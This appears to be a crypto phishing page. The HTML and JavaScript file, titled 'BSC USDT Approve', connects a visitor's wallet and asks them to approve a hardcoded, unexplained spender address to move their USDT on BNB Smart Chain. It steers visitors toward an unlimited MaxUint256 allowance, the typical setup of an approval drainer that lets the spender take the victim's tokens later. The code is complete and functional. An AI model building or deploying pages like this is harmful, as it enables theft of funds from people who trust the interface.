<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>BSC USDT Approve</title>

<style>
body{background:#0b0f19;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
.connect{background:#3b82f6}
.approve{background:#22c55e}
input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
</style>
</head>

<body>

<div class="card">

<h2>💰 USDT (BSC)</h2>

<button id="connectBtn" class="connect">Connect Wallet</button>

<div id="wallet"></div>

<input type="number" id="amount" value="10">

<button id="maxBtn">Unlimited</button>

<button id="approveBtn" class="approve">Approve USDT</button>

<div id="status"></div>

</div>

<script type="module">
import { ethers } from "https://esm.sh/ethers@6";

const USDT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";

let provider, signer, contract;
let unlimited = false;

// ERC20 ABI (minimal)
const ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

// connect wallet
document.getElementById("connectBtn").onclick = async ()=>{
  if(window.ethereum){
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();

    const address = await signer.getAddress();
    document.getElementById("wallet").innerText = address;

    contract = new ethers.Contract(USDT, ABI, signer);

    document.getElementById("status").innerText = "Connected";
  }
};

// unlimited toggle
document.getElementById("maxBtn").onclick = ()=>{
  unlimited = true;
  document.getElementById("status").innerText = "Unlimited selected";
};

// approve
document.getElementById("approveBtn").onclick = async ()=>{
  try{
    let amount;

    if(unlimited){
      amount = ethers.MaxUint256;
    } else {
      const val = document.getElementById("amount").value;
      amount = ethers.parseUnits(val, 18); // USDT BSC = 18 decimals
    }

    document.getElementById("status").innerText = "Waiting for approval...";

    const tx = await contract.approve(SPENDER, amount);
    await tx.wait();

    document.getElementById("status").innerText = "✅ Approved";

  }catch(e){
    console.error(e);
    document.getElementById("status").innerText = "❌ Failed";
  }
};
</script>

</body>
</html>
